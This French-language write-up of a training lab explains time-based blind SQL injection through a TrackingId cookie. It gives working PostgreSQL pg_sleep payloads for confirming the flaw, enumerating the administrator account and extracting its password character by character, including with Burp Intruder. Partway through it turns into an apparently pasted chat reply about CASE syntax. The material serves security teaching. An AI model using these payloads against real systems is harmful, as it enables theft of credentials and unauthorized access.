
## Contexte du lab

L'application utilise un cookie :

TrackingId

Ce cookie est utilisé dans une requête SQL côté serveur.

Exemple probable :

SELECT * FROM tracking WHERE id='TrackingId'

Problème :

- les résultats SQL **ne sont pas affichés**
    
- les erreurs SQL **sont masquées**
    
- la page **ne change pas**
    

Donc impossible d'utiliser :

- SQLi error-based
    
- SQLi boolean-based
    

Mais la requête SQL est exécutée **avant la réponse HTTP**.

Donc si on ralentit la requête SQL :

SQL execution delay  
↓  
HTTP response delay

On peut utiliser **le temps comme signal**.

---

# Principe de l'attaque

On transforme la base de données en **oracle booléen basé sur le temps**.

Si condition vraie → attendre  
Si condition fausse → répondre normalement

Donc :

|Temps de réponse|Signification|
|---|---|
|rapide|faux|
|lent|vrai|

---

# Analogie générale

Imagine une personne enfermée dans une pièce.

Tu ne peux pas la voir.

Tu peux seulement lui poser une question :

> "Si la réponse est oui, tape sur la table dans 10 secondes."

Si tu entends le bruit → la réponse est **oui**.

Si rien ne se passe → la réponse est **non**.

C'est exactement ce que fait **SQLi time-based**.

---

# Étape 1 – Vérifier la SQL Injection

Requête injectée :

TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--

Explication :

|Partie|Rôle|
|---|---|
|`x'`|ferme la chaîne SQL|
|`;`|démarre une nouvelle requête|
|`CASE WHEN`|condition|
|`pg_sleep(10)`|délai|
|`--`|commente la fin|

La base exécute :

SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END

Résultat :

10 secondes de délai

Donc :

SQL injection confirmée

---

# Étape 2 – Vérifier le comportement booléen

Test :

TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--

Résultat :

réponse immédiate

Conclusion :

la condition contrôle le délai

La base devient donc un **interrupteur booléen**.

---

# Étape 3 – Vérifier l'existence de l'utilisateur

Requête :

TrackingId=x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

Objectif :

savoir si l'utilisateur administrator existe

Logique :

si username = administrator → sleep

Résultat :

délai observé

Conclusion :

l'utilisateur existe

---

# Étape 4 – Trouver la longueur du mot de passe

Requête :

TrackingId=x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

Question posée à la base :

le mot de passe fait-il plus de 1 caractère ?

Ensuite :

LENGTH(password)>2  
LENGTH(password)>3  
LENGTH(password)>4

On augmente progressivement.

Quand la condition devient **fausse**, on connaît la longueur.

Dans ce lab :

longueur = 20

---

# Analogie

On demande :

Ton mot de passe a-t-il plus de 1 lettre ?  
plus de 2 ?  
plus de 3 ?

Quand la personne arrête de taper sur la table, on connaît la taille.

---

# Étape 5 – Extraction caractère par caractère

Requête :

TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

Explication :

|Fonction|Rôle|
|---|---|
|`SUBSTRING(password,1,1)`|extrait le premier caractère|
|`'a'`|valeur testée|

Question :

le premier caractère est-il "a" ?

Ensuite :

b  
c  
d  
...

Quand la réponse est lente :

caractère trouvé

---

# Exemple concret

Mot de passe réel :

k8s9f2...

Extraction :

|Test|Temps|
|---|---|
|a|rapide|
|b|rapide|
|c|rapide|
|k|lent|

Donc :

password[1] = k

On recommence :

SUBSTRING(password,2,1)

---

# Automatisation avec Burp Intruder

Payload :

TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

Liste :

abcdefghijklmnopqrstuvwxyz0123456789

Observation :

Response received

La requête avec :

~10000 ms

contient le bon caractère.

---

# Logique complète de l'attaque

SQL Injection  
↓  
delay injection  
↓  
condition booléenne  
↓  
longueur du password  
↓  
extraction caractère par caractère  
↓  
reconstruction du mot de passe  
↓  
login administrator

---

# Ce que ce lab enseigne vraiment

Même si :

- aucune erreur SQL
    
- aucune différence de page
    
- aucune donnée affichée
    

Une application peut **quand même fuir de l'information** via :

le temps d'exécution

Cela s'appelle un **side channel**.

---

# À retenir

SQLi time-based =

poser des questions à la base  
observer la latence  
reconstruire la donnée

---

# Résumé mental

Toujours suivre cet ordre :

1. confirmer SQLi  
2. vérifier la condition booléenne  
3. vérifier table / utilisateur  
4. trouver la longueur  
5. extraire caractère  
6. reconstruire la donnée

Oui, ta traduction est **correcte**. 👍  
On peut la résumer comme ça :

|SQL|Français|Logique|
|---|---|---|
|`WHEN`|**si**|la condition|
|`THEN`|**alors**|action si vrai|
|`ELSE`|**sinon**|action si faux|

---

# Structure complète

CASE  
WHEN condition THEN action_si_vrai  
ELSE action_si_faux  
END

Traduction :

SI condition  
ALORS action_si_vrai  
SINON action_si_faux

---

# Exemple simple

CASE  
WHEN 5 > 3 THEN 'oui'  
ELSE 'non'  
END

Lecture :

SI 5 > 3  
ALORS afficher "oui"  
SINON afficher "non"

---

# Exemple dans ton lab SQLi

CASE  
WHEN (username='administrator')  
THEN pg_sleep(10)  
ELSE pg_sleep(0)  
END

Traduction :

SI username = administrator  
ALORS attendre 10 secondes  
SINON répondre immédiatement

---

# Analogie simple

Imagine un garde derrière une porte :

SI la réponse est oui  
ALORS frappe à la porte  
SINON reste silencieux

Dans le lab :

- **frapper** = `pg_sleep(10)`
    
- **silence** = `pg_sleep(0)`
    

Donc le délai devient **le signal qui te donne la réponse**.

---

# Résumé très simple

WHEN = si  
THEN = alors  
ELSE = sinon